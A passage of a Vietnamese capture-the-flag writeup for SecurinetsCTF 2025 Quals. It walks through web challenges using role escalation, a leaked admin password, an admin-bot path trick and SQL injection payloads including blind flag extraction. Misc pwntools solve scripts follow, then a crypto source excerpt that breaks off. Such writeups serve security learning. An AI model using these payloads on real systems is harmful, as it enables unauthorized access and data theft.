---
title: SecurinetsCTF 2025 Quals
published: 2025-10-06
description: "Writeup for SecurinetsCTF 2025 Quals."
image: "./image.png"
tags: ["Blog", "Web", "Crypto", "Misc", "Pwn"]
category: Writeup
draft: false
---


# Web

## Puzzle

Sau khi đọc source thì mình nhận thấy ở hàm đăng ký có thể leo role lên quyền editor

```python
@app.route('/confirm-register', methods=['POST'])
def confirm_register():
    username = request.form['username']
    email = request.form.get('email', '')
    alphabet = string.ascii_letters + string.digits + '!@#$%^&*'
    password = ''.join(secrets.choice(alphabet) for _ in range(12))
    role = request.form.get('role', '2')

    role_map = {
        '1': 'editor',
        '2': 'user',
    }

    if role == '0':
        return jsonify({'error': 'Admin registration is not allowed.'}), 403

    if role not in role_map:
        return jsonify({'error': 'Invalid role id.'}), 400
```

Và nếu ở editor thì có thể đọc bất ký thông tin của user nào. Ở đây, có thể thấy endpoint này sẽ fetch luôn cả password người dùng nên mình sẽ tìm cách leak admin UUID để leak admin password.


```python
@app.route('/users/<string:target_uuid>')
def get_user_details(target_uuid):
    current_uuid = session.get('uuid')
    if not current_uuid:
        return jsonify({'error': 'Unauthorized'}), 401

    current_user = get_user_by_uuid(current_uuid)
    if not current_user or current_user['role'] not in ('0', '1'):
        return jsonify({'error': 'Invalid user role'}), 403

    with sqlite3.connect(DB_FILE) as conn:
        conn.row_factory = sqlite3.Row
        c = conn.cursor()
        c.execute("""
            SELECT uuid, username, email, phone_number, role, password
            FROM users 
            WHERE uuid = ?
        """, (target_uuid,))
        user = c.fetchone()
```

Nhưng leak bằng cách nào ? Khi đọc `/publish` thì mình thấy có thể thêm collaborator thông qua username nên mình có thể thêm admin vào.

```python
@app.route('/publish', methods=['GET', 'POST'])
    def publish():
        if not session.get('uuid'):
            return redirect('/login')
    
        user = get_user_by_uuid(session['uuid'])
        if not user:
            return redirect('/login')
        
        if user['role'] == '0':
            return jsonify({'error': 'Admins cannot publish articles'}), 403
        
        if request.method == 'POST':
            title = request.form.get('title')
            content = request.form.get('content')
            collaborator = request.form.get('collaborator')
            
            if not title or not content:
                return jsonify({'error': 'Title and content are required'}), 400
            
            try:
                with sqlite3.connect(DB_FILE) as conn:
                    c = conn.cursor()
                    c.execute("SELECT COUNT(*) FROM articles WHERE author_uuid = ?", (session['uuid'],))
                    article_count = c.fetchone()[0]
                    
                    if (article_count >= 20):
                        return jsonify({'error': 'You have reached the maximum limit of 20 articles'}), 403
                    
                    if collaborator:
                        collab_user = get_user_by_username(collaborator)
                        if not collab_user:
                            return jsonify({'error': 'Collaborator not found'}), 404
                        
                        request_uuid = str(uuid4())
                        article_uuid = str(uuid4())
                        c.execute("""
                            INSERT INTO collab_requests (uuid, article_uuid, title, content, from_uuid, to_uuid)
                            VALUES (?, ?, ?, ?, ?, ?)
                        """, (request_uuid, article_uuid, title, content, session['uuid'], collab_user['uuid']))
                        conn.commit()
                        return jsonify({'message': 'Collaboration request sent'})
                    else:
                        article_uuid = str(uuid4())
                        c.execute("""
                            INSERT INTO articles (uuid, title, content, author_uuid)
                            VALUES (?, ?, ?, ?)
                        """, (article_uuid, title, content, session['uuid']))
                        conn.commit()
                        return jsonify({'message': 'Article published successfully'})
            except Exception as e:
                return jsonify({'error': str(e)}), 500
        
        return render_template('publish.html')
```

Nhưng phải chờ admin accept lời mời collab. Tới đây mình đọc source của endpoint `accept` và đây chính là key của bài. Ta có thể thấy user được lấy bằng uuid trong session nhưng không hề check username, email, v.v. nên với vai trò là người publish ta có thể `accept giùm` admin

```python
@app.route('/collab/accept/<string:request_uuid>', methods=['POST'])
def accept_collaboration(request_uuid):
    if not session.get('uuid'):
        return jsonify({'error': 'Unauthorized'}), 401

    user = get_user_by_uuid(session['uuid'])
    if not user:
        return redirect('/login')
    if user['role'] == '0':
        return jsonify({'error': 'Admins cannot collaborate'}), 403

    try:
        with sqlite3.connect(DB_FILE) as conn:
            conn.row_factory = sqlite3.Row
            c = conn.cursor()

            c.execute("SELECT * FROM collab_requests WHERE uuid = ?", (request_uuid,))
            request = c.fetchone()

            if not request:
                return jsonify({'error': 'Request not found'}), 404

            c.execute("""
                INSERT INTO articles (uuid, title, content, author_uuid, collaborator_uuid)
                VALUES (?, ?, ?, ?, ?)
            """, (request['article_uuid'], request['title'], request['content'], 
                  request['from_uuid'], request['to_uuid']))

            c.execute("UPDATE collab_requests SET status = 'accepted' WHERE uuid = ?", (request_uuid,))
            conn.commit()

            return jsonify({'message': 'Collaboration accepted'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

POC: 

* Đăng ký account với role editor

![image](https://hackmd.io/_uploads/ryFpuxZTll.png)

* Bây giờ ta có thể dễ dàng đọc thông tin thông qua UUID

![image](https://hackmd.io/_uploads/B1lbKl-Teg.png)

* Thử publish với collaborator là `admin`

![image](https://hackmd.io/_uploads/rkKrYl-axg.png)

* Vào `collaborations` và thấy một request collaborator
 
![image](https://hackmd.io/_uploads/HkDDFlWale.png)

* Accept bằng 1 post request như sau
 
![image](https://hackmd.io/_uploads/SJSJsebaeg.png)

* Tới đây ta vào post vừa mới đăng và có amdin collab và đã leak được UUID
 
![image](https://hackmd.io/_uploads/HJpmsxZagg.png)
 
![image](https://hackmd.io/_uploads/BJsGjeWpxg.png)

* Đọc thông tin của user admin

![image](https://hackmd.io/_uploads/Sykvigbaex.png)

* Đăng nhập vào admin

![image](https://hackmd.io/_uploads/BkO9jxbale.png)

Vậy là ta đã vào được admin panel. Tới đây thì mình thấy có endpoint bị SSTI nhưng mà filter này nohope quá nên mình skip

```python
@app.route('/admin/ban_user', methods=['POST'])
@admin_required
def ban_user():
    def is_safe_input(user_input):
        blacklist = [
        '__', 'subclasses', 'self', 'request', 'session',
        'config', 'os', 'import', 'builtins', 'eval', 'exec', 'compile',
        'globals', 'locals', 'vars', 'delattr', 'getattr', 'setattr', 'hasattr',
        'base', 'init', 'new', 'dict', 'tuple', 'list', 'object', 'type',
        'repr', 'str', 'bytes', 'bytearray', 'format', 'input', 'help',
        'file', 'open', 'read', 'write', 'close', 'seek', 'flush', 'popen',
        'system', 'subprocess', 'shlex', 'commands', 'marshal', 'pickle', 'tempfile',
        'os.system', 'subprocess.Popen', 'shutil', 'pathlib', 'walk', 'stat',
        '[', '(', ')', '|', '%','_', '"','<', '>','~'
        ]
        lower_input = user_input.lower()
        return not any(bad in lower_input for bad in blacklist)

    username = request.form.get('username', '')

    if not is_safe_input(username):
        return admin_panel(ban_message='Blocked input.'), 400

    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE username = ?", (username,))
        user = c.fetchone()

    if not user:
        template = 'User {} does not exist.'.format(username)
    else:
        template = 'User account {} is too recent to be banned'.format(username)

    ban_message = render_template_string(template)

    return admin_panel(ban_message=ban_message), 200
```

Ta cũng thấy có `/db` và `/data` khá khả nghi nên mình thử vào

![image](https://hackmd.io/_uploads/HyEP2gZTgx.png)


![image](https://hackmd.io/_uploads/BkPIhlW6le.png)

 
File `secrets.zip` cần password nên mình khá chắc flag nằm trong này. Lúc này chỉ cần tìm password thui

![image](https://hackmd.io/_uploads/Bk2Yng-pgg.png)

Thông tin trong old.db có phần password nhưng bị hash hết rồi nên mình skip

![image](https://hackmd.io/_uploads/HkWypeZ6gg.png)

Thử tìm trong file `dbconnect.exe` xem

![image](https://hackmd.io/_uploads/Bkpuaeb6xe.png)

Password: `PUZZLE+7011_X207+!*`

Đây rồiiii, mình thử extract và đã có flag

![image](https://hackmd.io/_uploads/ry1JAeWTgx.png)

Flag: `Securinets{777_P13c3_1T_Up_T0G3Th3R}`

 
## S3cret5

Giao diện trang web:

![image](https://hackmd.io/_uploads/HJCU-VZpll.png)

Sau khi đăng nhập:

![image](https://hackmd.io/_uploads/r1wZfV-Teg.png)

Mình có thử XSS nhưng có lẽ đã bị escape. Mình thử đọc source và thấy có 2 chỗ có thể khai thác

```js
router.post("/", authMiddleware, async (req, res) => {
  const { url } = req.body;

  if (!url || !url.startsWith("http://localhost:3000")) {
    return res.status(400).send("Invalid URL");
  }

  try {
    const admin = await User.findById(1);
    if (!admin) throw new Error("Admin not found");

    const token = jwt.sign({ id: admin.id, role: admin.role }, JWT_SECRET, { expiresIn: "1h" });

    // Launch Puppeteer
    const browser = await puppeteer.launch({
      headless: true,
      args: ["--no-sandbox", "--disable-setuid-sandbox"],
    });

    const page = await browser.newPage();

    // Set admin token cookie
    await page.setCookie({
      name: "token",
      value: token,
      domain: "localhost",
      path: "/",
    });

    // Visit the reported URL
    await page.goto(url, { waitUntil: "networkidle2" });

    await browser.close();

    res.status(200).send("Thanks for your report");
  } catch (error) {
    console.error(error);
    res.status(200).send("Thanks for your report");
  }
});
```

và

```js
exports.addAdmin = async (req, res) => {
  try {
    const { userId } = req.body;

    if (req.user.role !== "admin") {
      return res.status(403).json({ error: "Access denied" });
    }

    const updatedUser = await User.updateRole(userId, "admin");
    res.json({ message: "Role updated", user: updatedUser });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to update role" });
  }
};
```

Có thể thấy web có tính năng add role admin cho 1 account khác nhưng yêu cầu phải có role admin. Và tính năng report đã giải quyết vấn đề đó.

Nhưng một vấn đề khác lại sinh ra chính là addAdmin phải là một post request và có body là url cần đi tới là id của user. Ta đọc đoạn JS sau của trang profile

```js
fetch("/log/"+profileId, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        credentials: "include",
        body: JSON.stringify({
          userId: "44", 
          action: "Visited user profile with id=" + profileId,
          _csrf: csrfToken
        })
      })
      .then(res => res.json())
      .then(json => console.log("Log created:", json))
      .catch(err => console.error("Log error:", err));

```

Vậy là đã có hướng đi rồi chỉ cần report với `profileId` là `user/profile/?id=48/../../admin/addAdmin` là xong

![image](https://hackmd.io/_uploads/HJlEsDNbTgg.png)

Khi vào lại thì ta đã leo thang thành công

![image](https://hackmd.io/_uploads/HknnP4-6xx.png)

Ta có 2 tab được public ra là all msgs và all users

![image](https://hackmd.io/_uploads/r1nd1H-Tlx.png)

![image](https://hackmd.io/_uploads/SkFYJrZ6ll.png)

mình tiếp tục đọc source và phát hiện ra hàm findall msgs

```js
  findAll: async (filterField = null, keyword = null) => {
    const { clause, params } = filterHelper("msgs", filterField, keyword);

    const query = `
      SELECT msgs.id, msgs.msg, msgs.type, msgs.createdAt, users.username
      FROM msgs
      INNER JOIN users ON msgs.userId = users.id
      ${clause || ""}
      ORDER BY msgs.createdAt DESC
    `;


    const res = await db.query(query, params || []);
    return res.rows;
  },
```

nó sẽ gọi hàm filterBy trong filterHelper

```js
function filterBy(table, filterBy, keyword, paramIndexStart = 1) {
  if (!filterBy || !keyword) {
    return { clause: "", params: [] };
  }

  const clause = ` WHERE ${table}."${filterBy}" LIKE $${paramIndexStart}`;
  const params = [`%${keyword}%`];

  return { clause, params };
}
```

Và chỗ này mình có thể dễ dãng SQL injection thông qua filterBy. Mình thử một payload sau `msg" like $1 or 1=1 --`

![image](https://hackmd.io/_uploads/BkZjMSWpeg.png)

Và ta đã SQL injection thành công. Để leak flag thì mình có thể blind SQLI như sau `msg" like $1 or (select substring(flag,1,1)='S' from flags) --`

![image](https://hackmd.io/_uploads/BknUNrb6gg.png)

Nếu ký tự khác thì sao ?

![image](https://hackmd.io/_uploads/BkuKEHWaxl.png)

Ye quá ngon. Cứ tiếp tục thì ta sẽ tim được full flag

Flag: `Secuinets{239c12b45ff0ff9fbd477bd9e754ed13}`

# Misc

## Easy Jail

Source của challenge:

```python
import random
import string

seed = random.randint(0, 2**20)
shift_rng = random.Random(seed)

class ProtectedFlag:
    def __init__(self, value):
        self._value = value

    def __str__(self):
        return "variable protected, sryy"

    def __repr__(self):
        return "variable protected, sryy"

    def __getitem__(self, index):
        try:
            return self._value[index]
        except Exception:
            return "variable protected, sryy"

# Example flag
flag = ProtectedFlag("flag{dummy_flag}")

def shift_mapping(mapping):
    # well guess how it was done >_<

def make_initial_mapping():
    letters = list(string.ascii_lowercase)
    shuffled = letters[:]
    random.shuffle(shuffled)
    return dict(zip(letters, shuffled))

def main():
    valid_chars = set(string.ascii_lowercase + "[]()~><*+")
    mapping = make_initial_mapping()
    print("Welcome to the shifting jail! Enter text using only a-z, []()~><*+")

    try:
        while True:
            user_in = input("> ").strip()
            if len(user_in) > 150:
                raise ValueError(f"Input exceeds 150 characters")

            if not all(c in valid_chars for c in user_in):
                print("Invalid input. Only [a-z] and []()~><*+ are allowed.")
                continue

            encoded = "".join(mapping[c] if c in mapping else c for c in user_in)

            mapping = shift_mapping(mapping)
            try:
                result = eval(encoded, {"__builtins__": None}, {"flag": flag})
                print(result)
            except Exception:
                print(encoded)

    except KeyboardInterrupt:
        print("\nGoodbye!")

if __name__ == "__main__":
    main()
```

Tóm tắt thì đây là challenge jail mà input mình nhập vào sẽ bị mã hoá caesar cipher ngầu nhiên

![image](https://hackmd.io/_uploads/rJtwzZ-6gl.png)

Nếu như lệnh đó chạy được thì sẽ trả ra output eval của lệnh đó nếu không thì sẽ trả ra cipher. Ở đây challenge còn filter chỉ cho `Only [a-z] and []()~><*+` và eval trong builtins như thế này `eval(encoded, {"__builtins__": None}, {"flag": flag})`. Có một cái còn hi vọng là `flag` cũng được đưa vào builtins nên mình có thể leak từng char như sau `flag[0]`, `flag[1]`, ...

```python
from pwn import remote
import string

HOST, PORT = 'misc-b6c94dd8.p1.securinets.tn', 7000

p = remote(HOST, PORT)

flag = ""

def get_encoded(line: str):

    try:
        for j in range(3, 100):
            p.recvuntil(b'> ')
            p.sendline(line.encode())
            echo = p.recvline().decode().strip()
            encoded = p.recvline().decode().strip()
            m = dict(zip(encoded, string.ascii_lowercase))
            pay = m['f'] + m['l'] + m['a'] + m['g']
            pay += '['
            pay += "(((not())+(not()))**((not())+(not())+(not())+(not())))+".replace('not',m['n']+m['o']+m['t'])
            pay += "+".join(['(not())'.replace('not',m['n']+m['o']+m['t'])]*j)
            pay += ']'
            print(pay)
            # print(len(pay))
            for i in range(1000):
                p.recvuntil(b'> ')
                p.sendline(pay.encode())
                echo = p.recvline().decode().strip()
                encoded = p.recvline().decode().strip()
                if ('*' not in encoded):
                    global flag
                    flag += encoded
                    print(flag)
                    break
    finally:
        p.close()

if __name__ == '__main__':
    get_encoded(string.ascii_lowercase)
```

Tóm tắt thì nó sẽ gen ra một payload như thế này `flag[(not())+(not())]` thì là `flag[2]` và nó sẽ leak kí tự thứ 3 của flag. 

Phần `pay += "(((not())+(not()))**((not())+(not())+(not())+(not())))+".replace('not',m['n']+m['o']+m['t'])` sẽ tự điều chỉnh tuỳ theo phần nào của flag đã được leak.

Và cuối cùng là sẽ chạy liên tục đến khi caesar mã hoá ra được `flag...` thì sẽ chạy được

![image](https://hackmd.io/_uploads/H1c0Q--Tgx.png)

Đây là phần cuối của flag mà mình đã leak.


Flag: `Securinets{H0p3_Y0u_L0ST_1t!}`

## md7

Source của challenge: 

```js
const fs = require("fs");
const readline = require("readline");
const md5 = require("md5");

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

function askQuestion(query) {
  return new Promise(resolve => rl.question(query, resolve));
}


function normalize(numStr) {
  if (!/^\d+$/.test(numStr)) {
    return null;
  }
  return numStr.replace(/^0+/, "") || "0";
}

console.log("Welcome to our hashing factory ");
console.log("let's see how much trouble you can cause");

function generateHash(input) {
  input = input
    .split("")
    .reverse()
    .map(d => ((parseInt(d, 10) + 1) % 10).toString())
    .join("");

  const prime1 = 31;
  const prime2 = 37;
  let hash = 0;
  let altHash = 0;

  for (let i = 0; i < input.length; i++) {
    hash = hash * prime1 + input.charCodeAt(i);
    altHash = altHash * prime2 + input.charCodeAt(input.length - 1 - i);
  }

  const factor = Math.abs(hash - altHash) % 1000 + 1;
  const normalized = +input;
  const modulator = (hash % factor) + (altHash % factor);
  const balancer = Math.floor(modulator / factor) * factor;
  return normalized + balancer % 1;
}

(async () => {
  try {
    const used = new Set();

    for (let i = 0; i < 100; i++) {
      const input1 = await askQuestion(`(${i + 1}/100) Enter first number: `);
      const input2 = await askQuestion(`(${i + 1}/100) Enter second number: `);

      const numStr1 = normalize(input1.trim());
      const numStr2 = normalize(input2.trim());

      if (numStr1 === null || numStr2 === null) {
        console.log("Only digits are allowed.");
        process.exit(1);
      }

      if (numStr1 === numStr2) {
        console.log("Nope");
        process.exit(1);
      }

      if (used.has(numStr1) || used.has(numStr2)) {
        console.log("😈");
        process.exit(1);
      }


      used.add(numStr1);
      used.add(numStr2);

      const hash1 = generateHash(numStr1);
      const hash2 = generateHash(numStr2);

      if (md5(hash1.toString()) !== md5(hash2.toString())) {
        console.log(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣾⠿⢫⡤⠀⣄⢈⠛⠷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡶⠛⠋⢡⣾⡿⣿⡴⠁⠀⠀⣿⣾⣿⡁⠈⠛⠶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣦⣤⡀⠀⠀⠀⠀⢀⣤⡾⠟⠋⠐⠂⠸⠿⣿⣿⠿⠀⠩⠛⠀⠛⠻⣦⡅⠀⠀⠀⠀⠙⢧⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠌⠙⠷⣦⣴⡾⠟⡡⠴⠂⠀⠀⠀⠀⠀⠀⠙⠦⠴⣤⣄⡀⠛⠶⣽⣮⡀⠀⠀⠀⠀⠀⠻⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣧⣰⢠⢞⡛⠉⠙⠋⠁⠀⠀⠀⠀⠀⠀⣀⡀⢄⡂⢰⡘⢿⢻⣤⢃⠄⡉⢻⡗⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⡇⣸⡇⠀⠀⠀⠀⠀⠀⠀⢀⡀⢾⣋⡝⣬⣟⣴⣫⣟⢾⣶⣿⣾⣤⣭⣿⠀⠀⠀⠀⠀⠘⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣧⣿⡇⠀⠀⠀⠀⠀⠀⢠⣼⠏⣾⣿⣽⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⡀⡀⣽⣇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣼⡧⠀⠀⠈⢀⣱⣘⣿⣿⣋⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣹⣿⣿⣿⣿⣤⠃⡜⢻⣟⣿⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣯⣽⡗⣌⣺⠡⣘⣾⣿⣿⣿⣯⣞⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣹⣿⣿⣿⢧⣙⣔⣻⣿⣿⣿⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⡹⢛⠶⣾⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡧⢌⠹⢹⣾⣿⢿⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠿⣷⣌⢺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠐⢪⡐⣣⣿⣿⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣿⡿⠀⠉⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢉⣦⣍⣝⣿⣿⠏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⠁⢰⠀⠁⢘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣩⠒⢢⢰⡘⣿⣿⡏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣦⠟⠀⠀⠈⢩⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠱⠀⠈⠄⢂⣿⣿⣿⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⡄⠀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⡿⢟⣿⣿⣿⣿⢛⣿⣿⣿⡿⠉⠀⠀⠀⠀⢠⣸⣿⡏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡾⠟⠛⠛⠳⣶⣿⣟⢆⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⠱⣋⠔⡢⠑⣎⠣⣜⣶⠿⠃⠀⠀⠀⠀⠀⠠⠇⣿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⠤⣤⣤⣼⠏⠀⠀⠀⠀⠀⠀⠙⠿⣿⣷⣄⠀⠀⠀⠀⠀⠈⠹⣿⡆⡑⠈⠄⠑⠨⢹⣥⣲⡶⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣠⡴⢾⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠈⢿⣾⣅⠀⢈⠡⢩⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣴⣾⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣥⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⢣⠀⠀⠀⢀⠀⠀⠀⢢⣾⣿⣿⣶⡼⢣⣽⣿⣻⡿⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣄⠀⠀⠀⠀⠀
⣤⡾⠋⠉⠀⠀⠹⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣷⢦⣄⣀⣠⣤⣴⣶⣿⣿⠟⠉⠀⠀⠀⠀⢳⡀⠀⢸⠟⢿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⠀⠀⠀
⣿⠁⠀⠀⠀⠀⠈⠻⠦⠄⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣮⣭⣥⣶⣾⣿⠟⠁⠀⠀⠀⠀⠀⠀⠈⢷⣦⡀⢛⡾⣿⣿⣿⣿⢿⣭⡖⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⣄⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣟⡛⡟⢿⢻⣟⣿⣿⠔⠂⠀⠀⠀⠀⠀⠀⠀⠀⠸⣷⣾⡐⣿⣿⣿⣼⡿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣆
⣟⠀⠀⠀⠀⣠⡄⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⢸⡯⢜⠩⢖⡩⡟⠙⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢿⣷⣿⣿⡿⠟⠟⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡍
⡇⠀⠀⠀⠀⣿⠇⠀⠀⠀⠀⢸⣇⠀⠀⠀⠀⠀⢸⣿⢎⡑⢮⣇⣇⠀⠀⢿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠩⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡜
⡇⠀⠀⠀⠀⢿⡇⠀⠀⠀⠀⢼⣯⠀⠀⠀⠀⠀⠘⣿⢦⣱⣾⣿⠋⠀⠀⠀⠹⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⡼
⡿⠀⣀⠀⠀⢺⣇⠀⠀⠀⠀⣸⣿⡀⠀⠀⠀⣀⣼⠟⠛⠉⠉⠀⠀⠀⠀⠀⢀⣼⣿⣶⡀⠀⠤⢀⡤⣤⣙⡴⣀⢤⣄⠲⠤⢄⡀⣀⡀⢀⣀⣀⡀⠄⡀⡀⢀⡀⢀⠀⡄⢤⡈⣵⡐
⣷⣀⠈⡄⢈⠽⣿⡀⠆⢀⡤⢸⣿⣷⣠⣠⣼⠟⠁⠀⢀⣤⡤⣤⣤⣤⢶⣩⣾⣿⣿⠼⣇⠀⡆⢦⡔⢦⢭⡹⣬⢏⠶⣭⣛⢮⡝⣧⣾⡱⢮⣱⣙⢦⡵⣩⡶⣜⣬⡳⣎⣧⣝⡶⣽
⠟⠷⠿⠛⠾⠿⡿⢷⣯⣬⣵⣷⣾⣿⣯⣿⣷⣠⣤⣼⣩⣴⣦⣭⣴⣽⣿⣿⣟⣩⢃⡾⢀⢣⠼⣦⢽⣚⡶⣽⣎⣿⣻⢶⣯⣟⣾⣳⢯⣟⣯⣷⣻⢮⣽⣷⣻⡽⣾⡽⣽⢾⡽⣞⣷`);
        process.exit(1);
      }

      console.log("Correct!");
    }

    console.log("\ngg , get your flag\n");
    const flag = fs.readFileSync("flag.txt", "utf8");
    console.log(flag);

  } finally {
    rl.close();
  }
})();
```

Tóm tắt thì challenge yêu cầu mình nhập hai số khác nhau, sau đó chạy qua một hàm hash và nếu đúng thì tiếp tục. Cứ đúng 100 lần thì trả ra flag.

Ban đầu mình fuzz thì thấy khi số và số + thêm 9 ở cuối thì sẽ trùng hash

![image](https://hackmd.io/_uploads/Sygk---ael.png)

Tới đây mình có solve script sau:

```python
from pwn import *

p = remote('numbers.p2.securinets.tn', 7011)
p.recvuntil(b'cause\n')

for i in range(1, 101):
    a = '1' * i
    b = a + '9'
    p.sendlineafter(b'number: ', a.encode())
    p.sendlineafter(b'number: ', b.encode())
    print(f"{i}: {a}, {b}")

print(p.recvall().decode())
p.close()
```

![image](https://hackmd.io/_uploads/Skr_ZWbaee.png)

Flag: `Securinets{floats_in_js_xddddd}`

# Crypto

## XTaSy
Source code:
```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import os, json
from secret import FLAG

class AES_XTS:
    def __init__(self):
        self.key = os.urandom(64)
        self.tweak = os.urandom(16)

    def encrypt(self, plaintext):
        encryptor = Cipher(algorithms.AES(self.key), modes.XTS(self.tweak)).encryptor()
        return encryptor.update(plaintext.encode('latin-1'))

    def decrypt(self, ciphertext):
        decryptor = Cipher(algorithms.AES(self.key), modes.XTS(self.tweak)).decryptor()
        return decryptor.update(ciphertext)

def get_token(username, password):
    json_data = {
        "username": username,
        "password": password,
        "admin": 0
    }
    str_data = json.dumps(json_data, ensure_ascii=False)
    token = cipher.encrypt(str_data)
    return token

def check_admin(token):
    try:
        str_data = cipher.decrypt(token)
        json_data = json.loads(str_data)
        return json_data['admin']
    except:
        print(json.dumps({'error': f'Invalid JSON token "{str_data.hex()}"'}))
        return None


